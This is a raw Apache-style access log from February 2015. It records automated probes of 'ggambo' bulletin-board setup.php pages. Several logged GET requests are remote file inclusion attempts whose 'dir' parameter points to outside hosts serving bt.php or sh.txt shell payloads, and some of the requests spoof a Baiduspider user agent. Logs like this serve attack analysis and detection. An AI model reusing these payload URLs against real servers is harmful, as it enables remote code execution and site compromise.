1.224.163.80 - - [14/Feb/2015:17:04:57 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:17:04:58 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [14/Feb/2015:17:04:58 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [14/Feb/2015:17:04:59 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:17:04:59 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [14/Feb/2015:17:05:00 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:17:05:01 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:17:05:02 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:17:05:03 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:17:05:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
112.218.68.155 - - [14/Feb/2015:17:05:07 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
112.218.68.155 - - [14/Feb/2015:17:05:07 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
112.218.68.155 - - [14/Feb/2015:17:05:09 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
112.218.68.155 - - [14/Feb/2015:17:05:14 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
112.218.68.155 - - [14/Feb/2015:17:05:15 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
112.218.68.155 - - [14/Feb/2015:17:05:16 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
